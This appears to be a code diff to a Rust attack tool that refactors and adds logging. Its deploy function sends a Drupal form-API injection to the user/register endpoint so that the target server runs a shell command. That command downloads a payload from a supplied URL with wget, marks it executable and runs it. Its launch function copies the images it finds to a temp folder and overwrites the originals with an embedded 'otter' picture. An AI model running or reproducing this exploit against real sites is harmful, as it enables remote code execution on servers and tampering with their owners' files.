@@ -1,11 +1,13 @@
+extern crate log;
 extern crate reqwest;
-
 extern crate walkdir;
+
+use log::info;
 use reqwest::{get, Client};
 use std::env::current_dir;
 use std::env::temp_dir;
 use std::ffi::OsStr;
-use std::fs::{copy, create_dir, File};
+use std::fs::{copy, create_dir_all, File};
 use std::io::prelude::*;
 use std::path::PathBuf;
 use walkdir::WalkDir;
@@ -14,29 +16,25 @@ pub async fn deploy(target: &str, payload: &str) -> Result<String, Box<dyn std::
     let client = Client::new();
     let endpoint = "user/register";
     let query = "element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
+    let url = format!("http://{}/{}?{}", target, endpoint, query);
+    let injection = format!(
+        "echo 'wget {} -O ~/payload && chmod +x ~/payload && ~/payload launch' | bash > \"$(pwd)/payload.log\" 2>&1",
+        payload
+    );
     let req = [
         ("form_id", "user_register_form"),
         ("_drupal_ajax", "1"),
         ("mail[#post_render][]", "exec"),
         ("mail[#type]", "markup"),
-        (
-            "mail[#markup]",
-            &format!(
-                "echo 'wget {} -O ~/payload && chmod +x ~/payload && ~/payload launch' | bash > \"$(pwd)/payload.log\" 2>&1",
-                payload
-            )[..],
-        ),
+        ("mail[#markup]", &injection),
     ];
 
-    let resp = client
-        .post(&format!("http://{}/{}?{}", target, endpoint, query)[..])
-        .form(&req)
-        .send()
-        .await?;
+    info!("Sending injection {} to '{}'", injection, url);
+    let resp = client.post(&url).form(&req).send().await?;
 
     resp.error_for_status()?;
 
-    Ok(get(&format!("http://{}/payload.log", target)[..])
+    Ok(get(&format!("http://{}/payload.log", target))
         .await?
         .text()
         .await?)
@@ -48,7 +46,8 @@ pub fn launch() -> Result<(), Box<dyn std::error::Error>> {
     let mut tmpdir = temp_dir();
     tmpdir.push("otter");
 
-    create_dir(&tmpdir)?;
+    info!("Creating tmp directory {:#?}", tmpdir);
+    create_dir_all(&tmpdir)?;
 
     for image in images {
         let mut dest = tmpdir.clone();
@@ -58,10 +57,13 @@ pub fn launch() -> Result<(), Box<dyn std::error::Error>> {
         };
 
         dest.push(image_name);
+        info!("Found image {:#?} copying to {:#?}", image, dest);
         copy(&image, &dest)?;
 
-        let mut image = File::open(&image)?;
-        image.write_all(otter)?;
+        info!("Replacing {:#?} with otter", image_name);
+        let mut buf = File::create(&image)?;
+        buf.write_all(otter)?;
+        buf.flush()?;
     }
 
     Ok(())
